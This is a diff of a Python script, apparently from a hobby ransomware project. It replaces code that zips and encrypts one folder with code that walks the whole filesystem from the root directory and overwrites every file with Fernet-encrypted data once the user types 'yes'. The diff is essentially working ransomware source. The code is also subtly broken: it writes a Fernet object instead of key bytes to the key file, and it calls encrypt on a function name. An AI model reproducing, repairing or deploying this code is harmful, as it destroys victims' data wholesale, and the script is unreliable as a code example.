@@ -1,68 +1,52 @@
-import os
-import time
-import shutil
+import os, time
 from cryptography.fernet import Fernet
-from pathlib import Path
+from termcolor import colored
 
-keyfile = 'important.key'
-File_Format = 'zip'
-working_dir = os.getcwd()
-home = str(Path.home())
-path_file = working_dir+"\\paths.txt"
+# Base settings
+keyFile = 'important.key'
 
-
-def dir_search():
-    os.chdir('D:\\Users\\Daniel\\Desktop\\Securing Information\\Python\\')
-    for dirpath, dirs, files in os.walk("."):
-        with open(path_file, 'a') as p1:
-            paths = dirpath
-            p1.writelines(paths+'\n')
-            p1.close()
+# Determine Operation System.
+if os.name == 'posix':
+    root = "/"
+else:
+    root = "C:\\"
 
 
-Folder_Path = 'D:\\Users\\Daniel\\Desktop\\Securing Information\\Python\\my_projects\\randsomware\\.idea'
-Folder = os.path.basename(os.path.normpath(Folder_Path))
-File = Folder + '.' + File_Format
-
-
-def zipping(output, kind, folder):
-    shutil.make_archive(output, kind, folder)
-    print("The folder " + Folder + " was successfully zipped into " + File + "\n")
-
-
-with open(path_file, 'r+') as file3:
-    for line in file3:
-        folder1 = file3.readline()
-        folder2 = os.path.basename(os.path.normpath(folder1))
-        folder3 = folder2
-        zipping(Folder, File_Format, working_dir)
-        print()
-        time.sleep(2)
-
-
-def encrypting(filename):
-    print('Working on key file...\n')
+# Creating a key file and value.
+def key():
     key = Fernet.generate_key()
-    key1 = open(keyfile, "wb")
-    key1.write(key)
-    key1.close()
-    print("Key was successfully made as " + keyfile + "\nMake sure you keep it safe !\n")
+    key = Fernet(key)
+    path = os.getcwd()
+    with open(keyFile, "wb") as file:
+        file.write(key)
+        file.close()
+    print('Key file was created in ' + path + ' with the name : ' + keyFile + '\nDO NOT LOSE IT !')
+    return key
 
-    with open(keyfile, "rb") as f1:
-        key = f1.read()
-    print('Key was successfully loaded.')
-    f = Fernet(key)
+
+# Encrypting file with created key.
+def enc(filename):
     with open(filename, "rb") as file:
-        file_data = file.read()
-        print('File was successfully rade.\n')
-    file_enc = f.encrypt(file_data)
-    print('File was successfully encrypted')
-    with open(filename, 'wb') as file:
-        file.write(file_enc)
-        print('Encrypted file was successfully created')
+        filed = file.read()
+    enc_file = key.encrypt(filed)
+    with open(filename, "wb") as file:
+        filed = file.write(enc_file)
+    print('File : ' + colored(filename, 'green') + ' successfully encrypted.')
 
 
-print('hi')
-encrypting(File)
+def get_file():
+    for r, d, f in os.walk(root):
+        for file in f:
+            filePath = os.path.join(r, file)
+            enc(filePath)
 
 
+if __name__ == '__main__':
+    Go = input('Hello user, do you want to start encrypting ?\nYes to begin, No to quit')
+    if Go.lower() == "yes":
+        print(colored('Encrypting started !\n', 'red'))
+        key()
+        time.sleep(2)
+        get_file()
+    else:
+        print('Yeah you better be careful !')
